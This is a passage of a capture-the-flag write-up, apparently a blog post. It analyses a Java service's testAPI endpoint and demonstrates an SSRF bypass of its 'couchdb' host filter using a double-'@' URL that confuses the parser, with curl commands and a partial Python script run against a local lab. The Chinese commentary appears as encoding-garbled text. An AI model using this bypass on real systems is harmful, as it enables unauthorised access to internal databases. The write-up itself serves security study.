&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal username&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/_security&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">configObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™éƒ¨åˆ†æ˜¯åˆ›å»ºç”¨æˆ·å¹¶æ’å…¥æ•°æ®åº“ä¸­ å¹¶ä¸”æ’å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¬¸ ç”¨çš„ä¹Ÿæ˜¯httpå‘è¯·æ±‚è¿™ä¸€æ‹› è¿™ä¸å°±å¯æ§äº†ï¼Ÿ&lt;/p>
&lt;p>è¿™é‡Œå°±å®Œäº†ï¼Œè½¬å»çœ‹Handlers.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“å‘å‡ºä¸€ä¸ªè¯·æ±‚ å¸¦ç€usernameå’Œpasswdæ—¶ï¼Œå®ƒä¼šè°ƒç”¨&lt;code>createUser()&lt;/code>åˆ›å»ºä¸€æ¡ç”¨æˆ·çš„æ•°æ®å­˜å…¥åº“ä¸­ï¼Œå¹¶ä¸”å­˜ä¸€ä¸ªflagDocï¼›æ¥ç€çœ‹æœ€åä¸€ä¸ªtestAPI&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">testAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">urlURI&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">urlURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHost&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;couchdb&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">MalformedURLException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input URL is malformed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">stringJsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsFlag&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stringJsonObj&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Request method is not accepted&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹ç»™å‡ºçš„urlï¼ˆé€šè¿‡urlå‚æ•°è¿›è¡Œæäº¤ï¼‰è¿›è¡Œgetæˆ–è€…postï¼Œå…ˆæ£€æŸ¥&lt;code>if (urlURI.getHost().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>ï¼Œå¦‚æœä¸ºçœŸç›´æ¥æŠ¥é”™ï¼›ä¹‹åå‘å‡ºè¯·æ±‚ å¦‚æœ&lt;code>Utils.containsFlag(stringJsonObj)&lt;/code>ä¸ºçœŸä¹Ÿä¼šæŠ¥é”™å‡ºå»&lt;/p>
&lt;p>æºç ç®—æ˜¯çœ‹å®Œäº†ï¼Œæ¥ä¸‹æ¥æƒ³æƒ³è§£é¢˜çš„æ–¹æ³•ï¼ˆæœ‰éƒ¨åˆ†å…³äºssrfçš„å‰ç½®çŸ¥è¯†å¯ä»¥çœ‹è¿™ç¯‡é¼»ç¥–ppt - &lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ğŸŠOrange Tsai&lt;/a>ï¼‰&lt;/p>
&lt;p>æœ¬åœ°å…ˆèµ·ä¸€ä¸ªç¯å¢ƒï¼Œrun on localhost:8080ï¼Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl localhost:8080/testAPI?url&lt;span style="color:#f92672">=&lt;/span>https://couchdb:5984/&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>GET
Illegal!
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”±ä¹‹å‰çš„ä»£ç åˆ†ææˆ‘ä»¬çŸ¥é“å› ä¸ºcouchdbçš„å­˜åœ¨æ‰€ä»¥illegalï¼Œä½†æ˜¯ä¸å¤ªé‡è¦ï¼ˆåæ­£ç»ˆä¼šè¢«ç»•è¿‡ï¼‰å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://localhost:8080/createUser?username&lt;span style="color:#f92672">=&lt;/span>neptunian&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>neptunian
&lt;span style="color:#75715e"># Creating user&lt;/span>
success
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Listing &amp;#34;neptunian&amp;#34; database documents, using our credentials (jq formats our JSON output)&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{fake}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¾ç„¶å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬çš„fake flagä¼šè¢«è‡ªåŠ¨æ’å…¥è¿™ä¸ªæ•°æ®åº“ä¸­ï¼Œå¹¶ä¸”ç›´æ¥curlæ˜¯å¯ä»¥å–å‡ºæ¥çš„ï¼Œä½†æ˜¯é¢˜ç›®æ˜¯ä¸èƒ½ç›´æ¥curl éœ€è¦ç¼åˆåˆ°é™å®šçš„testAPIä¸Šï¼Œå°è¯•æ„é€ ä¸€ä¸‹~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -vv http://localhost:8080/testAPI?method&lt;span style="color:#f92672">=&lt;/span>GET&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>http://neptunian:neptunian&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984/neptunian
...
success
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·æ„é€ çš„urlå¹¶ä¸ä¼šè§¦å‘filterï¼Œä½†æ˜¯ç”±äºä»…ä»…è¿”å›successè€Œæ²¡æœ‰æ›´å¤šçš„ä¿¡æ¯ï¼Œä¸ºäº†éªŒè¯æ˜¯ä¸æ˜¯è§¦åŠåˆ°äº†couchdb serverï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ’å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„docï¼Œè¿™é‡Œç”¨pyè„šæœ¬ä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># Simple POST Test&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Local&lt;/span>
